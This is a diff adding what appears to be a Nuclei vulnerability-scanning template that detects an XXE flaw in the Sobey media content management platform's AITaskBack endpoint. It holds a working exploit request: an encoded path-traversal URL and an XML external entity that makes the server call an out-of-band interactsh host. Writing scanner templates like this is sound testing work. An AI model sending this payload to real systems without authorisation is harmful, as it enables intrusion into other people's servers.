@@ -1,0 +1,35 @@
+id: sobey-imcmp-aitaskback-xxe
+info:
+  name: Sobey Fusion Media Content Management Platform AITaskBack XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
+        ]>
+        <root>
+          <TextResult>&xxe;</TextResult>
+        </root>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Sobey"
+          - "AITaskBack"
+          - "Request processing failed"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
